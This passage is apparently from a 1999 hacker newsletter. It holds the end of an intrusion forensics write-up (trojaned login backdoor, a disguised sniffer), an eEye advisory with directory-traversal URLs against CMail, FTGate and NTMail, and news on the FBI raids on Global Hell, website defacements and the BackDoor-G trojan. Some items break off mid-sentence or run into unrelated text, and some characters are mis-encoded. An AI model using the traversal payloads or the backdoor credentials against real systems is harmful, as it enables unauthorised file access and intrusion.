      changed: -rwxr-xr-x root        19840 Jul  9 17:56:10 1998 /sbin/ifconfig 
      changed: -rw-r--r-- root          649 Apr 27 16:59:54 1999 /etc/passwd 
      
      As you can see, a variety of binaries and files were modified.  There were no new entries in /etc/passwd (wisely, he had
      removed the crak0 and rewt accounts), so our intruder must have left a backdoor in one of the modified binaries.  Also, two
      files were added, /usr/sbin/sniff.pid and /usr/sbin/tcp.log.  Not suprisingly, /usr/sbin/sniff.pid was the pid of the sniffer,
      /usr/sbin/tcp.log was where he was storing all of his captured information.  Based on /usr/sbin/sniff.pid, the sniffer turned out to
      be rpc.nfsd.  Our intruder had compiled a sniffer, in this case linsniffer, and replaced rpc.nfsd with it.  This ensured that if the
      system was rebooted, the sniffer would be restarted by the init process.  Strings confirms rpc.nfsd is the sniffer: 
      
      mozart #strings /usr/sbin/rpc.nfsd | tail -15 
      cant get SOCK_PACKET socket 
      cant get flags 
      cant set promiscuous mode 
      ----- [CAPLEN Exceeded] 
      ----- [Timed Out] 
      ----- [RST] 
      ----- [FIN] 
      %s => 
      %s [%d] 
      sniff.pid 
      eth0 
      tcp.log 
      cant open log 
      rm %s 
      
      After reviewing the system and understanding what happened, I left the system alone.  I was curious to see what the intruder's
      next steps would be.  I did not want him to know that I had caught him, so I removed all of my entries from /usr/sbin/tcp.log. 
      
      The Script Kiddie Returns 
      
      The following day our friend returned.  By logging his keystrokes, I quickly identified the backdoor, /bin/login was trojaned. 
      This binary, used for telnet connections, was configured to allow the account "rewt" root privileges with the password "satori". 
      The password "satori" is the default password for all trojaned binaries that the rootkit lrk4 uses, a giveaway that your system
      may have been compromised. 
      
      The intruder was checking on his sniffer to ensure it was still functioning.  Also, he wanted to confirm if any accounts were
      captured since the previous day.   You can review his keystrokes at keystrokes.txt.  Notice at the bottom of the log our
      intruder kills the sniffer.  This was the last thing he did before terminating the session.  However, he quickly returned several
      minutes later with another session, only to start the sniffer again.  I'm not exactly sure why he did this. 
      
      This process of checking the system continued for several days.  Every day the intruder would connect to the system to confirm
      the sniffer was running  and if it had captured any valuable data.  After the fourth day, I decided that this was enough and
      disconnected the system.  I had learned enough from the intruder's actions and was not going to learn anything new. 
      
      Conclusion 
      
      We have seen in this paper how an intruder may act , from start to finish, once they gain root on your system. They often begin
      by checking to see if anyone is on the system.  Once they know the coast is clear, they cover their tracks by clearing the logfiles
      and replacing or modifying critical files. Once they are safely hidden, they move onto new and more damaging activities.  These
      tactics are here to stay, as new exploits are constantly being discovered. To better protect yourself against these threats, I
      recommend you armor your systems.  Basic armoring will protect against most script kiddie threats, as they normally go for the
      easy kill.  For ideas on how to armor your system, check out Armoring Linux or Armoring Solaris.  If it is to late and you feel
      your system has already been compromised, a good place to start is CERT's site "Recovering from an Incident" .

 11.0 Cox Report Blasts DOE Computer Security 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNN http://www.hackernews.com/ 

      contributed by erewhon 
      In addition to revealing that China has stole numerous
      military secrets from the US the Cox Report, unclassified
      yesterday, blasts the Department of Energy on
      computer security. The report blamed the DOE for giving
      to much computer access to foreign nationals. The
      issue is access to systems or information covered by
      export control laws. While the systems or software are
      not physically exported, use of the technology by some
      foreign nationals is called a "deemed export" and is
      covered under Department of Commerce rules.

      House report faults DOE computer access by
      foreign nationals

      BY ELANA VARON (varon@fcw.com)

      A report issued today about theft of U.S. nuclear secrets by China
      concludes that the Energy Department has been too free in granting foreign
      nationals access to its supercomputers.

      The report, by the House Select Committee on U.S. National Security and
      Military/Commercial Concerns With the People's Republic of China, said
      DOE officials are required to review whether such access violates federal
      export controls. But the report also said lab officials "lack an essential
      understanding" of the export rules. The report cited interviews with Commerce
      Department officials who said they did not recall ever receiving a license
      application to "export" the technology from any of the labs.

      Although the systems or software are not physically exported, use of the
      technology by some foreign nationals is called a "deemed export" because
      sending the technology overseas would require a license. The report said the
      labs do not measure the power of their systems in such a way that they could
      determine which systems are subject to the export rules, and lab officials never
      asked Commerce how to determine if the DOE systems were subject to
      export control.

      The report also concluded that foreign graduate students and staff at U.S.
      universities who are conducting DOE-supported research have the same
      computer privileges as students who are U.S. citizens, even though some of
      the foreign students are affiliated with their countries' intelligence agencies.

      The report noted that DOE is preparing a counterintelligence plan that
      addresses these issues.

 12.0 Black Hat Briefings Announced 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      contributed by Code Kid 
      Come and meet the Hackers. Secure Computing has officially announced Black Hat '99
      the third annual meeting of the minds between security professionals, white and black
      hat hackers. (If you are deep in the Security business and can only go to one conference
      then this is it.) (And Microsoft is now a cosponsor, how ironic is that?)

      Secure Computing Corporation Announces Black Hat
      Briefings '99, Bringing Together Corporate and
      Government Experts, and Hackers to Address Y2K And Enterprise
      Security
      
      SAN JOSE, Calif., May 25 /PRNewswire/ -- Secure Computing (Nasdaq: SCUR - news) today 
      announced that Secure Computing Black Hat Briefings '99, the exclusive security 
      conference, will take place from July 7-8, 1999 at the Venetian Hotel on the Las Vegas
      Strip. This third annual conference brings corporate and government engineers and software
      programmers face-to-face with today's cutting edge computer security experts and 
      ``underground'' security specialists for two days of intensive discussions on who's 
      breaking in to computer networks, how they are doing it, how Y2K is affecting security,
      and what can be done to address this.
      
      The conference, with title sponsorship by Secure Computing, and lead sponsorship by 
      Microsoft (Nasdaq: MSFT - news),National Computer Security Center, Counterpane Systems 
      and Network Flight Recorders is designed to fill the need of computer professionals to 
      better understand the security risks to their computer and information infrastructures by
      potential threats. To do this, Secure Computing assembles a group of vendor neutral 
      security professionals at the same forum, where they will candidly discuss and debate the
      problems businesses face, and the solutions they see to those problems. Secure Computing 
      Black Hat Briefings '99 is not for security dilettantes or marketers looking to hawk their
      vendors' wares -- just straight talk by people who make it their business to explore the 
      ever-changing security space.
      
      Spanning two days the conference has three separate tracks, two focused at technical 
      audiences with a third a new ``White Hat'' tract that is focused at CIO's, CEO's and other
      senior level people. Topics will include Y2K and what it means to system security, how to 
      detect and repel attacks on a network, secure programming techniques and tool selection for
      creating and effectively monitoring secure networks. Secure Computing Black Hat Briefings 
      '99 intense sessions will bring to light the security problems confronting organizations 
      and network administrators, most of which go unnoticed by today's preoccupied
      system administrators who are often more worried about network growth, updates and Y2K
      problems.
      
      Running the conference is Jeff Moss, Director of Assessment Services at Secure Computing.
      Prior to joining Secure Computing, Moss was at Ernst & Young, LLP, where he was a manager
      in the Information Security Services (ISS) group. Moss also successfully owned and operated
      DEF CON Communications, a computer consulting company that focused on
      network security solutions.
      
      ``It is crucial that we continue to educate organizations on the risks they face daily. 
      Network security breaches are real, and are costing organizations hundreds of millions of 
      dollars every year,'' said Moss. ``The coming year will be crucial for organizations
      in regards to their network security. Taking a myopic approach only to the Y2K issue that
      does not involve diligent attention to security could lead to severe consequences. Being 
      Y2K compliant really won't matter for much if an organization's network is rendered 
      ineffective by hacker attacks and intrusions. That is why a forum like Secure Computing 
      Black Hat Briefings '99 is so important in educating businesses and governments about the 
      very real threats that are out there.''
      
      Presenters range from corporate and government security system managers to master hackers
      themselves, including Dr.Mudge, one of the prominent members of the hacker group 
      'The L0pht', who is responsible for numerous advisories and tools in use in both the black
      hat and white hat communities; Peter Shipley, who is well known and respected in the 
      professional world as well as the underground and hacker community and whose specialties 
      are third party penetration testing and firewall review, computer risk assessment, and 
      security training; and Bruce Schneier, author of applied Cryptography and president of
      Counterpane Systems.

                  The Black Hat Briefings '99, July
                          7-8th Las Vegas


      It's late. You're in the office alone, catching up on database
      administration.  Behind you, your network servers hum along quietly,
      reliably.  Life is good.  No one can get to your data or disrupt your
      WAN. The network is secure.  Or is it? 

      The Black Hat Briefings conference has been organized to put an end
      to concerns like these.  While many conferences focus on information
      and network security, only The Black Hat Briefings will put your
      engineers and software programmers face-to-face with today's cutting
      edge computer security experts and "underground" security specialists.
      The "White Hat" track will inform your CEO or CIO with no-nonsense
      information about what issues to be aware of, and what they can ignore.

      Only the Black Hat Briefings conference will provide your people with
      the tools and understanding they need to help thwart those lurking either
      in the shadows of your firewall or the depths of your companies WAN. 
      The reality is, they are out there.  The choice is yours.  You can live in
      fear of them.  Or, you can learn from them.

                                 Conference Overview
                                 
      The Black Hat Briefings conference series was created to fill the need of computer
      professionals to better understand the security risks to their computer and information
      infrastructures by potential threats.  To do this we assemble a group of vendor neutral
      security professionals in the same room and let them talk candidly about the problems
      businesses face, and the solutions they see to those problems.  No gimmicks, just
      straight talk by people who make it their business to explore the ever changing security
      space. 
      
      Spanning two days with three separate tracks, The Black Hat Briefings will focus
      on the vital security issues facing organizations with large Enterprise networks and
      mixed network operating systems.  Topics will Include Intrusion Detection Systems
      (IDS), Computer Forensics (CF) systems, Incident Response, secure programming
      techniques and tool selection for creating and effectively monitoring your networks.  You
      will be put face to face with the people developing the tools used by and against
      hackers. 
      
      This year the Black Hat Briefings has grown to include a separate track specifically
      designed for the CEO and CIO. This third track, nick named the "White Hat" track,
      was developed by the National Computer Security Center (NCSC) of the
      National Security Agency.  While the other tracks have a technology focus, this track
      is for people who have to manage it.  What should you look for when hiring an outside
      security consultant?  Should you even look outside your organization?  
      
      The Black Hat Briefing's intense sessions will bring to light the security and
      mis-configuration problems confronting organizations and network administrators, most
      of which go unnoticed by today's preoccupied system administrators where security
      gets put off in lieu of constant network growth and upgrades.  Our speakers will discuss
      the strategies involved in correcting existing problems and speak towards what you can
      expect in the future. 
      
      This year you can expect more visual demonstrations, more speakers who are
      authoritative in their fields, and as always an excellent time. 
      
      As an added bonus, people who attend The Black Hat Briefings get free admission to

 13.0 eEYe Digital Security advisory: Multiple Web Interface Security Holes
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 


      Multiple Web Interface Security Holes
      Systems Affected
      CMail 2.3
      FTGate 2,1,2,1
      NTMail 4.20
      
      Release Date
      May 26, 1999
      
      Advisory Code
      AD05261999
      
      Description:
      
      The following holes were found while testing Retina against a few various
      services that have web based interfaces. The holes are nothing amazing just
      common amongst many web based interfaces. We are sure some other software
      will be found with similar holes... if you come across some contact
      info@eeye.com and let us know.
      
      ---> CMail
      
      The default location of the web based interface for CMail is C:\Program
      Files\Computalynx\CMail Server\pages\. It is a simple hole. For example if
      we were to load http://[server]:8002/../spool/username/mail.txt in our web
      browser we would be looking at the email for that user. Note: Mail.txt is
      not the real mail file. There is one minor problem... reading of files is
      not totally straight forward. It seems CMail has some mechanism of what it
      will read or not. If you have a text file with no carriage returns in it
      CMail will not read it. There also exists multiple buffer overflows within
      the various SMTP and POP server functions of CMail. Yes they are
      exploitable. >:-]
      
      ---> FTGate
      
      Same as above basically. http://[server]:8080/../newuser.txt The only
      difference is that FTGate doesn't seem to mind if the file has the carriage
      returns or not.
      
      ---> NTMail
      
      NTMail suffers from the same programming flaw...
      http://[server]:8000/../../../../../boot.ini.
      
      There is other server software out there that suffers from these common
      holes. An average of 65% of the software we have tested thus far has had
      problems with restricting the path that they allow. NTMail as well as the
      other two can be run as a service, NTMail does it by default, therefore you
      can read files as SYSTEM on most of them.
      
      Fixes
      
      Disable the web interfaces where applicable until the vendors release
      patches.
      
      Vendor Status
      
      All vendors have been notified.

 14.0 Fun with ICQ
      ~~~~~~~~~~~~

      'em out....
      
      From http://home.earthlink.net/~childzplay/comp.html
      
       Although Miribalis says they do not recommend using 99a yet, I've been using
      it for about 1 month and haven't had any trouble with it. Some other people I
      know have not been so lucky. I guess it is a use at your own risk deal until they
      officially release the 99a final version.
      
       If you didn't know, the server that comes as default in v.99a is watched closely
      by Miribalis. Therefore, if you want to go on an exploit journey, I would suggest
      connecting up to a more stable, and less watched server. Here are some for your
      entertainment:

      FBI Raids Suspected Crackers. 

      contributed by darkscent 
      It is often difficult to separate the fact from the fiction,
      rumors, supposition, and unsubstantiated allegations
      that fly around the net when big news breaks. This is
      what HNN has been able to verify so far. Yesterday
      morning at aprox 6:00 am CST the FBI executed nine
      search warrants in Houston, Seattle and various
      California locations. HNN believes that some of those
      who where raided where iCBM, MostHated, loophole,
      Spaceg0at, soulblazer, fryz, vallah and Cl0pz. HNN has
      not learned of any arrests that have been made. While
      the FBI has not revealed why the search warrants were
      executed it is believed to have some relation to the
      recent crack of whitehouse.gov. HNN has received no
      confirmation of Most Wanted lists or FBI Directives,
      rumors of which have been floating around the net. 

      MSNBC
      http://www.msnbc.com/news/273819.asp

      In response to the recent raids several other members
      of gH (Global Hell) as well as other groups such as Team
      spl0it have attacked numerous web sites, (estimates
      range from between 40 and 100). The FBI has admitted
      to receiving a major Denial of Service attack, and the
      US Senate web site was defaced for a few minutes. In
      an interview with MSNBC MostHated said "The
      retaliation has to stop." HNN received an email from
      "Israeli Ghost" claiming responsibility for the FBI DoS
      attack. HNN was also able to snag the US Senate web
      page defacement before it was restored.

      MSNBC:
      
      Feds vs. hackers: The battle widens
      FBI and Senate shut down Web sites after a series of attacks; 
      skirmishes waged with search warrants and Internet sieges
      By Brock Meeks, Alan Boyle and Bob Sullivan
      MSNBC


  
               
      May 28   Computer attacks on the FBI and U.S.
      Senate Web sites are leading to a broader
      criminal investigation into such intrusions,
      officials indicated Friday. The latest skirmish
      between federal authorities and Web site
      attackers began Wednesday with FBI raids on
      purported members of a group called gH, or
      Global Hell, in at least three states and has
      continued with a protest campaign targeting a
      wide spectrum of Internet sites.
      

             THE FBI and Senate Web sites remained inaccessible
      Friday as a result of the computer attacks. The FBI shut
      down its Web site Wednesday after it was swamped by a
      denial-of-service attack. 
             The Senate took its site offline Thursday night after
      attackers broke into the public computer server and
      replaced the congressional bodyÆs home page with a screed
      against the FBI.
             The hacked page claimed credit on behalf of a group
      known as the Masters of Downloading, or M0D ù and
      denigrated the FBI as well as Global Hell.
             ôThe FBI may be all over the other groups like ... gH
      and tK. ... M0D make those morons look like a group of
      special-ed students! FBI vs. M0D in Æ99, bring it on!ö read
      the page, which was peppered with ruder comments and
      hacker lingo. 
             The intrusion ôcompromised our Senate Internet Web
      site, and as a result the Senate has taken down our Web
      page to do some investigation,ö said Sherry Little, a
      spokeswoman for the Senate sergeant-at-arms, who
      manages the site.
             She said FBI agents were heading up the investigation.
             ôTheyÆre looking at the criminal aspects of it,ö she told
      MSNBC. ôTheyÆre in charge of the investigation, in that
      theyÆre trying to determine where it came from and whether
      there was any connection at all to any incidents that theyÆve
      explored in the past.ö
             The Web outage rendered the official home pages of all
      100 senators and senatorial committees inaccessible, but
      e-mail and other computer services not related to the public
      Web site were unaffected, Little said.
             System administrators for the FBI and the Senate Web
      sites were beefing up site security during the down time ù
      and no one could say exactly when the sites would be
      returned to service. ôWeÆre not expecting this to be a
      long-term problem,ö Little said.
             The FBI was continuing its investigation into the attack
      on its own Web site, said Dave Miller, a media
      representative at the bureauÆs national office. He confirmed
      that ôthis could result in criminal penalties.ö
             Although he declined to provide specifics on the
      investigation, Miller told MSNBC that ôit would be a logical
      pointö that the FBI would look for connections to past
      attacks on federal Web sites.
             Earlier this month, Global Hell was implicated in
      attacks on a variety of U.S. government sites, including sites
      for the White House, several Cabinet departments and the
      U.S. Information Agency. Last week, Global Hell member
      Eric Burns (who also goes by the name Zyklon), was
      arrested in connection with three attacks on government
      computers.
             Members of Global Hell reported that law-enforcement
      officials served search warrants early Wednesday in Seattle,
      Houston and California.
             In Houston, FBI spokesman Rolando Moss told
      MSNBC that agents were investigating ôallegations of
      computer intrusionsö involving a teen-ager who uses the
      hacker handle ôMosthated.ö He said the investigation was
      continuing and declined further comment.
             In telephone conversations with MSNBC, Mosthated
      said that his home was raided at about 6 a.m. CT
      Wednesday, and that family computer equipment was
      confiscated. He said his parents were ôreally mad. ... The
      computer had all their financial information and stuff on it.ö
      MosthatedÆs mother got on the line to read from the FBIÆs
      receipt for the equipment and confirm that she was ôreally
      mad.ö
             Mosthated said at least eight other people around the
      country had been served with search warrants as part of ôa
      huge hacker crackdown.ö Four other Houston-area
      hackers, three in California and one in Seattle reportedly
      received FBI visits. None was arrested, but all had
      computer equipment confiscated, he said.
             An FBI representative in San Diego said she could not
      comment on the investigation because the paperwork was
      sealed. Inquiries with the bureauÆs Seattle office met with a
      similar response: ôRight now there are still things that need
      to be decided,ö one agent told MSNBC on condition of
      anonymity. 
             

            White House Web site shut down

             The bureauÆs Web site went out of service only hours
      after the raids.
             According to AntiOnline, a computer security site, an
      individual calling himself Israeli Ghost was taking credit for
      the attack on the FBIÆs site. 
             ôFBI will not (profanity deleted) with my friends from
      Global Hell,ö the hacker allegedly wrote in an e-mail to
      AntiOnline.
             Other members of the hacking community, contacted
      by MSNBC, said the FBI site was hit by whatÆs called a
      denial-of-service attack. In such an attack, the host
      computer is not actually controlled by an outsider; rather,
      outsiders bombard a Web site with so many simultaneous
      hits that it becomes overwhelmed and can no longer
      function.
             Mosthated said he didnÆt know who was responsible
      for the denial-of-service attack. The FBI did ask some
      cursory questions about this monthÆs attack on the White
      House Web site. He said he was shown printouts of Web
      stories about the incident from MSNBC and CNN. ôBut
      they didnÆt really push those questions,ö Mosthated said. 


             As the day went on, other Web sites ù none of which
      had any apparent connection to the FBI ù were defaced.
      A correspondent claiming to be a Global Hell member
      called Infamous sent an e-mail message to MSNBC
      Wednesday night criticizing the FBI and saying he ôdefaced
      over 40 web domains today to state my opinion.ö The
      writerÆs identity could not be confirmed, however.
             
      æTHIS NEEDS TO STOPÆ
             The response to the raids has spread through the digital
      underground and taken on a life of its own, a spontaneous
      act of retaliation that wasnÆt asked for.
             ôThe retaliation has to stop,ö Mosthated said. ôAll this
      ... needs to stop. Have you seen all the Web pages that
      have been changed in the last hour? Someone told me that
      thereÆs been more than a hundred,ö he said.
             ôThis (retaliation) is just going to look worse on the
      people that did get raided,ö said the 18-year-old
      Mosthated, who says he stopped hacking last summer to
      set up his own security firm. 
             This impromptu show of support is going to backfire,
      he told MSNBC. ôEverything that gH has done is going to
      be put on my shoulders,ö owing to his position as the
      groupÆs founder. 
             The FBI agents who executed a search warrant on
      Mosthated said they were looking for evidence related to
      ôillegal telecom activity,ö he said, in particular illegally set-up
      conference calls. ôThe FBI told me some company lost
      $250,000 because of the illegal conference calling activity,ö
      he said.
             Mosthated and other sources indicated that the FBI
      appeared to be targeting other figures prominent in the
      hacker community. AntiOnline published a list of almost 100
      computer handles, purportedly taken from directives sent by
      the FBI to Internet service providers.

      Suspect was star hacker on the
      Internet but shy and lonely in real life 

      by Roberto Sanchez 
      Seattle Times staff reporter 

      In the world of computers, he was Zyklon, the
      aggressive "cracker" named after a poison gas,
      who had the skill to break into the Web sites
      of movie studios, universities and even the
      Chinese government. 

      But on the other side of the monitor -
      according to federal prosecutors - Zyklon was
      really Eric Burns, a lanky, shy, 19-year-old, a
      former student at Shorewood High School with few friends,
      several run-ins with the law, and an unhealthy obsession with a
      woman who didn't know anything about him. 

      Burns last week was indicted by a federal grand jury in
      Alexandria, Va., on three counts of computer intrusion.
      Prosecutors say Burns broke into hundreds of Web pages,
      altered files and caused thousands of dollars in damage. They say
      he often left behind text taunting his victims and professing his
      unrequited love for the woman, a former high-school classmate. 

      Burns lives in Shoreline. But he was indicted in the Washington,
      D.C., suburb because that's where the compromised computer
      systems are located. 

      Burns and his parents, Alice and Edward, did not return calls for
      comment. His lawyer, Ralph Hurvitz, advised his client not to give
      interviews. He said Burns will plead not guilty. 

      Acquaintances of Burns - who also took classes at Shoreline
      Community College last year - describe him as the stereotypical
      computer nerd: shy, didn't talk to many people, had few friends
      and spent much of his time on the computer. 

      "He was very smart, one of the smartest kids I know," said David
      Thompson, a member of Shorewood's class of 1998. "Eric knew
      and knows so much about computers. He's kind of a freak that
      way." 

      Even the woman, whom Burns idolized in practically every Web
      site he hacked, said she had never talked to or been personally
      approached by Burns. 

      "I didn't know who he was or what he did," she said. 

      She said she took one law class with him her senior year of high
      school. After that, she began to receive letters from him, then gifts.
      Court records say she received a crystal bell and a diamond
      necklace, which her family returned. 

      "Halfway through my senior year, someone called my house and
      told me to look up this (Web) address" for some of his
      handiwork, the woman said. She never did. 

      She said she didn't go to the police or seek a restraining order
      because Burns didn't seem dangerous. 

      "He never did anything to threaten me," she said. 

      A former friend said Burns had a mean side, which he often
      expressed in his hacking and "cracking" - the term for breaking
      into Web sites. 

      "He was into it for the power," said Eric Lindvall, a former student
      at Shorewood who was a friend of Burns' in 1994. He said he,
      Burns and two other students spent much of their free time
      together, breaking into computer or phone systems, getting access
      to credit-card numbers and phone accounts. 

      Lindvall said he and Burns actually got caught by FBI agents in
      1994 when they used a stolen credit-card number to buy
      computer equipment. They were not prosecuted, and he said he
      stopped spending time with Burns after that. 

      Lindvall also said Burns and two other students were arrested in
      1996 for allegedly using stolen credit-card numbers to buy
      computer gear, then reselling it to stores or individuals. Again,
      Burns was not prosecuted, he said.. 

      An affidavit filed by the U.S. Attorney said Burns bragged online
      to an acquaintance about getting caught for credit fraud as a
      minor. The Shoreline Week, a community newspaper, published a
      story Oct. 2, 1996, about three Shoreline teens arrested for credit
      fraud. 

      Whatever popularity Burns lacked in the real word, he made up
      for on the Internet. His alleged exploits were regularly featured in
      Web sites dedicated to computer hacking. Some people even
      admired him; a cracker who defaced the University of
      Washington's engineering Web site in April dedicated the deed to
      Zyklon. 

      Zyklon apparently took his name from the gas used by Nazi
      Germany to exterminate Jews. 

      Burns will be arraigned on June 14. If guilty, he faces up to 15
      years in prison. 

      Roberto Sanchez's phone message number is 206-464-8522.

      Real hacker war-games

      Recently hackers became more and more active. US government and Universities
      are keep being hacked. Even the official White House site (www.whitehouse.gov) was
      hacked, and replaced with anti-Clinton messages and pictures. Government struck.
      Eric Burns aka Zyklon, a gH member was caught and indicted on the count of several
      break-ins. His name was also mentioned in "greetz" area of hacked White House
      site, so he was questioned about it too. Zyklon, 19 year old,  could get up to 15 years 
      of imprisonment. His fellow hackers from gH hacked in revenge several domains
      with messages of protest against the Government.  MAST3RZ 0F D0WNL0ADING
      earlier today hacked the official US Senate site (www.senate.gov), and wrote about
      battle against FBI and US government. FBI site (www.fbi.gov) was under big DoS
      (denial of service) attack, and the "attacker" mailed HNN about it (read his mail in
      HNN Buffer Overflow section).
      Today AntiOnline and HNN published more details of hackers raided by FBI 2 days ago.
      HNN wrote that :"some of those who where raided where iCBM, MostHated, loophole, 
      soulblazer, fryz, vallah and Cl0pz". We found out that following hackers were too involved
      in this FBI actions:
      
          - Zyklon (he is found and indicted) 
          - Spacegoat (already found) 
          - Spade (already found) 
          - Overfien (still looking for him) 
          - Rottenboy (still looking for him) 
          - Hybrid (still looking for him) 
          - Sketch (still looking for him) 
          - Lord Omino (still looking for him) 
      
      The crew from Channel 12 did a background check on the hackers and their supposed crimes.
      
      - Rottenboy aka PowerDragon is wanted for telecommunications fraud
      
      - Gino Ramano is also wanted for telecommunications fraud
      
      - Lord Omino aka moviesmith is too wanted for telecommunications fraud

      Hackers Add Senate To Victims

      Hackers have added the U.S. Senate's main page to their list of owned 
      web sites in an escalating war between the FBI and "crackers" around 
      the globe. 

                Hackers defaced the main page for the Senate late Thursday
      leaving the message: "The FBI may be all over the other groupz, like
      those gH and tK queerz, cl00bagz gal0re. M0D make th0se m0ronz l00k
      like a gr0up of special-ed st00dentz!@# FBI vs. M0D in '99, BR1NG IT
      0N FUQRZ! (BTW NIPC IZ ALS0 0WNED)." 

      Members of the MOD group told security site, Antionline, that they
      gained access to another computer on the Senate's network, installed a
      sniffer, and swiped the administrators passwords. On Friday, the
      Senate's page was still down but a mirror of the hacked site was kept on
      Antionline. 

      On Wednesday, an attack on the FBI's main page spooked the agency
      enough to take down its main page. The FBI's page also remained down
      Friday morning.

      FBI Site Attacked

      The latest victim in a skirmish between hackers and the FBI may have been
      the brown-shoes own web site. 

      The FBI's main web page remained offline Thursday afternoon while the Bureau
      checked it for security intrusions. The FBI reportedly took the page down 
      Wednesday after someone attempted to hack it. 

      The skirmish apparently began Wednesday morning when FBI agents in
      the Houston office raided the homes of hackers who allegedly belonged
      to a group called "gH." Agents did not arrest anyone but confiscated
      computers of numerous people. 

      According to security news site, antionline.com, the FBI has also directed
      numerous ISPs to preserve backup tapes, logs, e-mail, and IRC
      conversations for about thirty individuals suspected of being hackers.

      WASHINGTON (May 28, 1999 12:04 a.m. EDT http://www.nandotimes.com) - Computer hackers
      continued a series of electronic attacks against Internet sites of federal agencies on Thursday, defacing the
      Web page for the U.S. Senate before it was taken down. 
      
      The Web site for the FBI also remained inaccessible late Thursday, a day after the agency said hackers tried
      unsuccessfully to compromise it. It was unclear when the FBI site might be made available again. 
      
      "There was an attempt (Wednesday) by unknown persons to unlawfully gain access to the FBI.Gov Web site,"
      according to a statement Thursday from the agency. "It was unsuccessful; however, as a precaution, the FBI
      shut down the site and is now taking additional steps to further insulate it." 
      
      An obscene message left briefly on the Senate's Web site Thursday blamed the attack on what it said was the
      FBI's harassment of specific hacker groups, including the group that took credit for breaking into the White
      House site earlier this month. 
      
      "Who laughs last? ...," the message said, adding that the intent was to send a monition "... to our friends at the
      FBI." 
      
      Other federal Web sites, including those for the White House and the House of Representatives, appeared to
      be operating normally late Thursday. 
      
      MSNBC reported that the attacks stemmed from the FBI's executing a search warrant on the home of a
      prominent hacker in Houston, Texas. 
      
      FBI spokesman Rolando Moss confirmed that agents were investigating allegations of computer intrusions
      involving the Houston hacker. The FBI executed four search warrants that remained sealed, Moss said. 
      
      Earlier this month, a grand jury in northern Virginia indicted Eric Burns, 19, on three counts of computer
      intrusion. Burns is reportedly known on the Internet as "Zyklon" and believed to be a member of the group that
      claimed responsibility for the attacks on the White House and the Senate sites. 
      
      Federal prosecutors accused Burns of breaking into a computer between August 1998 and January 1999 in
      northern Virginia that is used by the U.S. Information Agency. 
      
      "Zyklon" was one of a dozen names listed on the hacked version of the White House Web site, which was
      altered overnight Sunday for a few minutes before government computers automatically detected the intrusion. 
      
      The grand jury also accused Burns of breaking into two other computers, one owned by LaserNet of Fairfax,
      Va., and the other by Issue Dynamics Inc. of Washington.

      Hackers react to FBI
      crackdown by invading
      Senate Web site

      May 27, 1999
      Web posted at: 11:04 p.m. EDT (0304 GMT)

      WASHINGTON (CNN) --
      Computer hackers reacted to an FBI crackdown by launching cyber assaults
      Thursday on government Web sites, including the one belonging to the U.S.
      Senate. 

      People calling up the Senate Web site on Thursday were redirected to one
      belonging to the hackers. Posted on the site under the hackers' logo was
      the question: "Who laughs last?"  

      The cyber intruders wrote that their Internet invasion of the legislative site
      was a way for them to thumb their noses at the FBI. 

      Federal agents earlier this week executed search warrants on
      suspected hackers' homes in Dallas, Houston and other locations. FBI
      sources did not specify if anyone was arrested, but said they believe word of
      the raids quickly spread in the computer community. 

      That attempt to crack down on computer hackers preceded a seemingly
      coordinated cyber attack that overloaded the FBI's own Web site, forcing
      the agency to shut down the site, officials said Thursday. 

      FBI officials said their site was besieged with computer hits by scores of
      computer users who were apparently outraged over the raids. 

      No virus was planted in the FBI site, but the sheer number of hits overloaded
      the system, said FBI spokesman Frank Scafidi, who described the incident as a
      "denial of service attack." 

      He said the system has been shut down temporarily so additional firewalls
      can be erected to protect it. It was unclear when the site would be back up. 

      The FBI's site contains general information about the agency and does not
      house sensitive information.

      Yet another Trojan horse that leaves MS Windows systems wide open has been discovered.
      This new backdoor tool is similar to Back Orifice or NetBus. NetBus is now a commercial
      shareware product. Back Orifice has undergone a major rewrite and a new version, BO2K,
      is expected to be released at this years DefCon hacker convention. Once a a system has 
      had any one of these programs installed they become wide open to unknown remote users 
      who have complete control over the system.

      New Back Orifice-like Trojan found
      BackDoor-G allows remote access to victimÆs PC; Trojan
      horse arrives as spam with screen saver or game update
      By Bob Sullivan
      MSNBC

      May 27 ù Security researchers at Network
      Associates Inc. say they have found another
      Back Orifice-like Trojan Horse hack tool called
      BackDoor-G. The Trojan horse arrives in a
      userÆs e-mail posing as a screen saver or game
      update, but once executed, it turns the victimÆs
      PC into an ôopen client.ö Then, a hacker can
      add, delete, move or execute files on the victimÆs
      computer at will from anywhere on the Internet.     
      
      BACKDOOR-G IS BEING SENT out in spam mail,
      according to Sal Viveros, group marketing manager at
      Network Associates. The company discovered it
      Wednesday.
             Updated versions of virus scanning software, including
      Network Associates products, will detect BackDoor-G and
      clean it from a victimÆs system.
             Such ôremote administration toolsö started to surface
      last year when Back Orifice was released by a group calling
      itself the Cult of the Dead Cow. NetBus, another such tool,
      has since been developed into a commercial product by its
      author. With both programs, a victim is tricked into
      executing an e-mail attachment which then opens his PC to
      remote connections via the Internet. Once a victim is
      infected, a hacker can do anything to a machine that the
      victim can ù included erasing all files or copying all files. 
             Such tools represent a dangerous blending of what
      might once have been considered relatively harmless pranks
      by virus writers and hackers, Viveros said
             ôWeÆre seeing these types of malicious code attacks,
      which are trying to attack information directly or indirectly,ö
      he said. ôNow weÆre seeming to blur the lines between
      malicious code attacks and [data] vulnerability.ö
             BackDoor-G already has a variant ù a very similar
      Trojan named ôArmageddonö was discovered in France this
      morning. 
             Several Network Associates clients opened the
      attachment and exposed their systems, Viveros said. But
      when the promised screen saver did not execute, they called
      the virus company.

 18.0 [CNN] A Q&A with Emmanuel Goldstein, editor of 2600 magazine
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      I didn't see a date on the following interviews but they appear fairly timeless
      so since I just found them I thought i'd share em with you...- Ed 
      
      http://www.cnn.com/TECH/specials/hackers/qandas/

                 Q&A with Emmanuel Goldstein of
                 2600: The Hacker's Quarterly

                 (CNN) -- Emmanuel Goldstein is the editor-in-chief
                 of 2600: The Hacker Quarterly and hosts a weekly
                 radio program in New York called "Off the Hook." 

                 1. How do you define hacking? 

                      Hacking is, very simply, asking a lot of
                      questions and refusing to stop asking. This
                      is why computers are perfect for inquisitive
                      people -- they don't tell you to shut up
